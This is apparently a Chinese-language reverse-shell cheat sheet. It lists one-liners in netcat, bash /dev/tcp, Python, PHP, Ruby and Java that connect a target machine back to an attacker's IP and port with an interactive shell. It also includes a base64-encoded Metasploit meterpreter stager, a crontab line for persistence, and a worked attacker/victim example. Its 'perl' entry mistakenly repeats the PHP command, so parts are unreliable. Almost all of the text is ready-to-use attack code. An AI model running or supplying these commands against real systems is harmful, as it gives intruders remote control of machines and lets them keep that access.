#### nc版本
```bash
正常nc版：
nc -e /bin/sh <your_ip> <your_post>

不使用-e版:
mknod backpipe p && nc <your_ip> <your_post> 0<backpipe | /bin/bash 1>backpipe

netcat-openbsd版本:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip> <your_post> >/tmp/f
```

#### bash版本
```bash
bash -i >& /dev/tcp/<your_ip>/<your_post> 0>&1
```
#### python版本
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_ip>",<your_post>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

另外的形式：
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"

Metasploit 版的代码：
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.168.90.1 LPORT=<your_post>
import base64; exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg=='))

```
#### php版本
```php
php -r '$sock=fsockopen("<your_ip>",<your_post>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### ruby版本
```ruby
ruby -rsocket -e'f=TCPSocket.open("<your_ip>",<your_post>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
#### Java版本
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<your_ip>/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
#### perl版本
```perl
php -r '$sock=fsockopen("<your_ip>",<your_post>);exec("/bin/sh -i <&3 >&3 2>&3");'
```
#### crontab 定时任务版：
```bash
 * * * * * /bin/bash -i >& /dev/tcp/<your_ip>/<your_post> 0>&1

```
 
虽然形式不同，但都是基于 / bin/bash 和 / bin/sh

## 使用实例:
攻击机运行: 
```
nc -v -l -p 9999
```

靶机运行：
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("攻击机ip",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![](http://www.asec.me/wp-content/uploads/2017/10/39dfcc77136ff4aab8ab83a491b48060.png)
## 参考:
[Linux反弹shell的10种姿势](https://masterxsec.github.io/2017/07/21/Linux%E5%8F%8D%E5%BC%B9shell%E7%9A%8410%E7%A7%8D%E5%A7%BF%E5%8A%BF/)
[各种环境下反弹 shell 的方法](http://www.zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html)

